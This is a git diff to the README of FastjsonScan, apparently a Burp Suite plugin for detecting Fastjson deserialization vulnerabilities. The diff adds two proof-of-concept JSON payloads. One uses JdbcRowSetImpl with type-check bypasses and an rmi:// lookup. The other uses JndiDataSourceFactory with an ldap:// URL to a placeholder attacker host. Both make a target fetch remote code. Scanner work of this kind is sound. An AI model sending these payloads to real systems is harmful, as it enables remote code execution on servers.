@@ -1,5 +1,38 @@
 # FastjsonScan
 
+#### poc1 `com.sun.rowset.JdbcRowSetImpl`
+```
+  {
+    "axin": {
+      "@type": "java.lang.Class",
+      "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "is": {
+      "@type": "com.sun.rowset.JdbcRowSetImpl",
+      "dataSourceName": "rmi://%s/aaa",
+      "autoCommit": true
+    }
+  },
+  {
+    "handsome": {
+      "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
+      "dataSourceName": "rmi://%s/aaa",
+      "autoCommit": true
+    }
+  }
+
+```
+
+#### poc2 `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`
+```
+{
+  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
+  "properties": {
+    "data_source": "ldap://x.x.x.x:1389/Basic/TomcatEcho"
+  }
+}
+```
+
 一个简单的Fastjson反序列化检测burp插件
 
 我在挖洞的时候看到一些json请求总是想要检测一下有没有Fastjson反序列化问题，本可以直接写一个脚本来跑或者搭配其他被动扫描器来验证，但是我太懒了，先不说burp搭配其他扫描器了，就连找到特定目录下的脚本我都觉得麻烦，所以，我决定一劳永逸地解决这个问题，于是去学习了一下burp插件的写法糊弄出了这个插件
